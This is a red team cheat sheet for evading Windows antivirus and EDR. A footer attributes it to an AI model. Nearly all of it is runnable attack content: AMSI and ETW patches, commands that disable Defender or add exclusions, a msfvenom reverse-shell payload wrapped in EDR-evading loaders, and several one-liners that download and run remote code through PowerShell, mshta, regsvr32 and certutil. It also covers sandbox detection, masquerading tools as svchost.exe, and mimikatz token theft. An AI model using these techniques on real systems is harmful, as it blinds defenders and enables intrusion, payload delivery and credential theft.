# AV & EDR Evasion

#evasion #amsi #edr #av #redteam #windows


## What is this?

Techniques for bypassing AV, Windows Defender, and EDR during red team engagements. Covers AMSI bypass, payload obfuscation, process injection, and EDR unhooking. Use when delivering payloads or running tools on hardened Windows hosts. Pairs with [[Shells & Payloads]], [[Windows Priv Esc]].


---

## Tools

| Tool | Use |
|---|---|
| [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) | Identifies flagged bytes in a binary (Defender/AMSI) |
| [DefenderCheck](https://github.com/matterpreter/DefenderCheck) | Similar to ThreatCheck, Defender-focused |
| [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) | PowerShell script obfuscation |
| [Chameleon](https://github.com/klezVirus/chameleon) | PowerShell obfuscation framework |
| [PEzor](https://github.com/phra/PEzor) | PE packer/loader with evasion options |
| [Donut](https://github.com/TheWover/donut) | Convert PE/.NET/VBS/JS to shellcode |
| [ScareCrow](https://github.com/optiv/ScareCrow) | EDR-evading payload generator |
| [Freeze](https://github.com/optiv/Freeze) | Payload creation with EDR bypass (Go) |
| [SharpBlock](https://github.com/CCob/SharpBlock) | Block EDR DLL injection via process creation |
| [InlineWhispers2](https://github.com/tastypepperoni/InlineWhispers2) | Direct syscall stub generation |
| [BokuLoader](https://github.com/boku7/BokuLoader) | Custom Cobalt Strike reflective loader |
| [mimikatz](https://github.com/gentilkiwi/mimikatz) | Many obfuscated variants exist |

---

## Enumeration — What's Running

Before evading, identify what you're up against.

```powershell
# Check Defender status
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled, IsTamperProtected

# Check Defender exclusions (often misconfigured)
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess

# List running AV/EDR processes
tasklist /svc | findstr -i "sense\|defender\|cylance\|crowdstrike\|carbon\|sentinel\|edr\|endpoint\|falcon\|cbdefense\|mssense"
Get-Process | Where-Object { $_.Name -match "Sense|MsMpEng|CylanceSvc|falcon|cbdefense|SentinelAgent|MBAMService" }

# Check loaded security drivers
fltMC                                   # Filter drivers (EDRs register here)
driverquery /v | findstr -i "defend\|sense\|falcon\|carbon"

# AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode    # Should be FullLanguage; ConstrainedLanguage = restricted
```

```bash
# Remote check via CME
crackmapexec smb <IP> -u <user> -p <pass> -M enum_av
```

---

## AMSI Bypass

AMSI (Antimalware Scan Interface) hooks PowerShell, .NET, VBScript, JScript. Bypass before loading tools.

> [!warning] Most raw AMSI bypasses are heavily signatured — obfuscate before use.

### Patch amsiInitFailed (Classic)

```powershell
# Forces AMSI to report initialization failed — disables scanning for the session
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Obfuscated variants:

```powershell
# String splitting to avoid static sigs
$a = 'System.Management.Automation.A';$b = 'msiUtils';
[Ref].Assembly.GetType($a+$b).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Char array
$x = [char[]]@(65,109,115,105,85,116,105,108,115) -join ''    # AmsiUtils
```

### Memory Patch (amsi.dll)

Patches the `AmsiScanBuffer` function in memory to always return `AMSI_RESULT_CLEAN`.

```powershell
# Classic patch — heavily signatured, obfuscate
$a = [System.Runtime.InteropServices.Marshal]
$b = $a::GetDelegateForFunctionPointer(
    (([System.Text.Encoding]::ASCII.GetBytes('amsi.dll') | ForEach-Object { $_ }) -join ''),
    [System.Func[int]]
)
```

Better approach — use a tool:

```powershell
# Chameleon generates obfuscated AMSI bypasses
python3 chameleon.py -l 1 -o bypass.ps1 amsi_bypass.ps1

# Or use Matt Graeber's approach via reflection (obfuscate strings yourself)
```

### AMSI via COM Bypass (Excel/Office context)

```vba
' In macro context — unregister AMSI provider
CreateObject("WScript.Shell").Run "powershell -c ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
```

### Downgrade PowerShell Version

AMSI only exists in PSv3+. Downgrade to v2 to avoid it entirely (if .NET 2/3.5 installed):

```powershell
powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Mimikatz.ps1')"
```

Check if available:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\PowerShell\'    # Look for key "1" = PSv1/2
```

---

## PowerShell Evasion

### Execution Policy Bypass

```powershell
powershell -ep bypass -c "<command>"
powershell -ExecutionPolicy Unrestricted -c "<command>"

# From within PS session
Set-ExecutionPolicy Bypass -Scope Process -Force

# Encode command (bypasses some logging/detection)
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc
```

### Script Block Logging Bypass

```powershell
# Disable via registry (requires admin)
Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0

# Patch via reflection (no admin) — patches ETW logging
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### ETW (Event Tracing for Windows) Patch

Blinds many EDRs that rely on ETW telemetry.

```powershell
# Patch EtwEventWrite to return immediately
$patch = [byte[]] (0xc3)    # ret instruction
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress ntdll.dll EtwEventWrite), [Action])
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 1)
```

```csharp
// C# — patch EtwEventWrite via VirtualProtect + WriteProcessMemory
// Use with Donut or inline .NET for stealth
```

### Constrained Language Mode Bypass

```powershell
# Check mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PSv2 (if available)
powershell -version 2

# Bypass via runspace (creates unrestricted runspace)
$rs = [runspacefactory]::CreateRunspace()
$rs.Open()
$ps = [powershell]::Create()
$ps.Runspace = $rs
$ps.AddScript("whoami").Invoke()

# AppLocker + CLM bypass via InstallUtil, MSBuild, regsvcs, etc. (see LOLBins section)
```

---

## Payload Obfuscation

### Invoke-Obfuscation

```powershell
Import-Module Invoke-Obfuscation
Invoke-Obfuscation
# TOKEN\ALL\1        — token-level obfuscation
# STRING\1           — string obfuscation
# ENCODING\5         — Unicode encoding
# LAUNCHER\PS\1      — wrapped launcher
```

### Manual String Obfuscation Techniques

```powershell
# Concatenation
$c = "Inv"+"oke-Mimi"+"katz"
& $c

# Format operator
"{0}{1}" -f "Invoke-","Mimikatz"

# Char codes
[char]73+[char]110+[char]118+[char]111+[char]107+[char]101    # "Invoke"

# Base64 encoded strings
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA'))

# SecureString (decodes at runtime)
$ss = ConvertTo-SecureString "Invoke-Mimikatz" -AsPlainText -Force
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
$cmd = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

### Chameleon (Automated)

```bash
# Obfuscate a PS1 script
python3 chameleon.py -l 3 -o evaded.ps1 Invoke-Mimikatz.ps1

# -l 1-3: obfuscation level
# Output is functionally identical but signature-broken
```

### Binary Payload Evasion — ThreatCheck

Identify exactly what bytes trigger detection, then patch/avoid them.

```powershell
# Scan a binary against Defender
ThreatCheck.exe -f mimikatz.exe
ThreatCheck.exe -f payload.exe -e Defender

# Scan a PS1 against AMSI
ThreatCheck.exe -f Invoke-Mimikatz.ps1 -e AMSI

# Output shows the flagged byte offset — patch around it
```

---

## Shellcode Delivery

### Donut — PE to Shellcode

```bash
# Convert a .NET assembly to shellcode
donut -f payload.exe -o shellcode.bin

# With AMSI/ETW bypass built in
donut -f payload.exe -b 3 -o shellcode.bin    # -b 3 = patch both AMSI + ETW

# Encrypt output
donut -f payload.exe -e 3 -o shellcode.bin    # -e 3 = AES encryption
```

### ScareCrow — EDR-Bypassing Loaders

```bash
# Generate a loader that bypasses common EDRs
ScareCrow -I shellcode.bin -Loader binary -domain microsoft.com

# DLL sideload delivery
ScareCrow -I shellcode.bin -Loader dll -domain microsoft.com

# Meterpreter shellcode + evasion
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f raw -o msf.bin
ScareCrow -I msf.bin -Loader binary -domain outlook.com
```

### Freeze — Go-Based Loader

```bash
# Create encrypted loader from shellcode
./Freeze -I shellcode.bin -O payload.exe -encrypt -sandbox

# DLL variant
./Freeze -I shellcode.bin -O payload.dll -encrypt -process explorer.exe
```

---

## Process Injection

### Classic DLL Injection

```csharp
// OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
// Target: a benign process (explorer.exe, svchost.exe, notepad.exe)
```

```powershell
# PowerShell variant — inject shellcode into remote process
$pid = (Get-Process explorer).Id
# Use Invoke-ReflectivePEInjection or custom C# assembly
```

### Process Hollowing

Spawn a suspended legitimate process, replace its memory with payload, resume.

```csharp
// CreateProcess (suspended) → NtUnmapViewOfSection → VirtualAllocEx
// → WriteProcessMemory → SetThreadContext → ResumeThread
```

Common targets: `svchost.exe`, `RuntimeBroker.exe`, `SearchIndexer.exe`

### Reflective DLL Injection

Load a DLL from memory without touching disk — no `LoadLibrary` call.

```powershell
# Invoke-ReflectivePEInjection (PowerSploit)
$bytes = (New-Object Net.WebClient).DownloadData('http://<IP>/payload.dll')
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId (Get-Process explorer).Id
```

### Early Bird APC Injection

Queue APC before thread starts — bypasses some EDR hooks.

```csharp
// CreateProcess (suspended) → VirtualAllocEx → WriteProcessMemory
// → QueueUserAPC(shellcode_addr, thread_handle) → ResumeThread
```

### Process Doppelgänging / Transacted Hollowing

Uses NTFS transactions to load payload — bypasses many user-mode hooks.

---

## EDR Unhooking

EDRs hook NTDLL user-mode functions (NtOpenProcess, NtAllocateVirtualMemory, etc.) to monitor syscalls. Unhooking removes their visibility.

### Overwrite NTDLL from Disk

```csharp
// Read clean NTDLL from disk (or KnownDlls) and overwrite the hooked in-memory version
// 1. Map fresh ntdll.dll from C:\Windows\System32\ntdll.dll
// 2. Read .text section of clean copy
// 3. VirtualProtect hooked ntdll .text section to RW
// 4. Copy clean .text over hooked .text
// 5. Restore permissions
```

Tools that do this automatically:
- **Freshycalls** — syscall resolver that avoids hooks
- **Syswhispers2/3** — generates direct syscall stubs at compile time
- **Hell's Gate / Halo's Gate** — dynamic syscall number resolution

### Direct Syscalls (Syswhispers)

Bypass user-mode hooks entirely by calling kernel directly.

```bash
# Generate syscall stubs for specific functions
python3 syswhispers.py --preset common -o syscalls

# Include in C project — replaces hooked NtAllocateVirtualMemory etc.
# with direct int 2e / syscall instructions
```

### Heaven's Gate (32→64 bit)

Execute 64-bit syscalls from a 32-bit process — bypasses 32-bit hooks entirely.

---

## Defender-Specific Bypasses

```powershell
# Disable Defender (requires admin/SYSTEM)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Add exclusion path (requires admin)
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Via registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Kill Defender service (requires TrustedInstaller or SeDebugPrivilege)
sc stop WinDefend
sc config WinDefend start= disabled
```

> [!note] Tamper Protection blocks most of the above. Check `IsTamperProtected` first — if enabled, use evasion instead of disabling.

```powershell
# Check Tamper Protection
Get-MpComputerStatus | Select-Object IsTamperProtected
```

---

## LOLBins for Evasion / Execution

Signed Windows binaries that bypass execution restrictions.

```cmd
# certutil — download + decode
certutil.exe -urlcache -split -f http://<IP>/payload.b64 payload.b64
certutil.exe -decode payload.b64 payload.exe

# mshta — execute HTA (HTML Application)
mshta http://<IP>/payload.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX(IWR 'http://<IP>/ps.ps1')"":Close")

# regsvr32 — AppLocker bypass, execute COM scriptlet
regsvr32 /s /n /u /i:http://<IP>/payload.sct scrobj.dll

# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<IP>/payload.sct")
rundll32 shell32.dll,Control_RunDLL payload.dll

# MSBuild — execute inline C# (AppLocker bypass)
msbuild.exe payload.csproj

# InstallUtil — execute .NET assembly (AppLocker bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# wmic — execute payload
wmic process call create "C:\Windows\Temp\payload.exe"

# bitsadmin — download
bitsadmin /transfer job /download /priority high http://<IP>/payload.exe C:\Windows\Temp\payload.exe
```

---

## Tradecraft / OPSEC

```powershell
# Avoid writing to disk — load entirely from memory
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')

# Use HTTPS for C2 traffic — blends with normal traffic
# Use domain fronting or redirectors to hide C2 infrastructure

# Sleep to evade sandbox detonation (sandboxes have time limits)
Start-Sleep -Seconds 120

# Check for sandbox indicators before executing
$env:COMPUTERNAME                  # Generic names = sandbox
(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory    # < 4GB = likely sandbox
(Get-Process).Count                # Very few processes = sandbox
[System.Diagnostics.Stopwatch]::GetTimestamp()              # Time acceleration detection

# Avoid common monitored paths
# Bad: C:\Windows\Temp\, C:\Users\Public\
# Better: C:\ProgramData\<legit-looking-folder>\, user AppData

# Rename tools to blend in
copy mimikatz.exe svchost.exe      # Rename to trusted process name
copy nc.exe winupdate.exe

# Use signed binary wrappers (LoLBins above) where possible
# Avoid spawning cmd.exe / powershell.exe as child of Office/browser processes
```

### Parent Process Spoofing

Spawn process with a different parent to avoid suspicious parent-child chains (Word → cmd.exe = alert).

```csharp
// Use PROC_THREAD_ATTRIBUTE_PARENT_PROCESS with UpdateProcThreadAttribute
// Set parent to explorer.exe or svchost.exe
// Tools: SelectMyParent, Cobalt Strike's spawnto, custom loader
```

### Token Impersonation for Evasion

```powershell
# Steal token from a SYSTEM process to avoid user-context detection
.\mimikatz.exe "privilege::debug" "token::elevate" "token::list" exit

# Impersonate a less-monitored user context
.\mimikatz.exe "privilege::debug" "token::impersonate /id:<token_id>" exit
```

---

## Common EDR Products — Notes

| EDR | Notes |
|---|---|
| **CrowdStrike Falcon** | Kernel sensor, very hard to kill. Focus on payload evasion, direct syscalls. |
| **SentinelOne** | Behavioral + static. Strong rollback. Avoid common injection patterns. |
| **Microsoft Defender for Endpoint (MDE)** | ETW-heavy. Patch ETW + AMSI. Tamper Protection blocks service kills. |
| **Carbon Black** | Network + process telemetry. Use encrypted C2, avoid noisy LOLBins. |
| **Cylance** | Strong ML-based static analysis. Obfuscate heavily, use shellcode loaders. |
| **Cortex XDR (Palo Alto)** | Blocks known injection techniques. Use less-common injection methods. |
| **Elastic EDR** | Open source signatures — check public rules to know what to avoid. |

---

## Quick Reference Checklist

```bash
[ ] Identify AV/EDR product and version
[ ] Check Tamper Protection status
[ ] Check Defender exclusions — may already be usable
[ ] Check AppLocker / CLM
[ ] Patch AMSI before loading tools
[ ] Patch ETW if EDR relies on it
[ ] Use ThreatCheck to identify flagged bytes before deploying payload
[ ] Load tools from memory, not disk
[ ] Use signed LOLBin if execution is restricted
[ ] Spoof parent process for noisy child spawns
[ ] Sleep before execution in automated pipelines
```

---

*Created: 2026-03-04*
*Updated: 2026-05-13*
*Model: claude-sonnet-4-6*